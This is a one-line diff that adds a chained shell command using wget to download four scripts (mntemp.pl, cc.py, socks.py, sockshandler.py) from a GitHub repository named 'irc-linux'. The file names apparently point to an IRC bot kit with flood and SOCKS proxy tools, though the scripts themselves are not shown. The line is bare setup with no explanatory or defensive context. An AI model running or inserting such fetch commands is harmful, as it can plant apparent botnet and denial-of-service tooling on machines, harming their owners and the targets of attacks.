@@ -1,0 +1,1 @@
+wget https://raw.githubusercontent.com/Paulo0819/irc-linux/main/mntemp.pl && wget https://raw.githubusercontent.com/Paulo0819/irc-linux/main/cc.py && wget https://raw.githubusercontent.com/Paulo0819/irc-linux/main/socks.py && wget https://raw.githubusercontent.com/Paulo0819/irc-linux/main/sockshandler.py
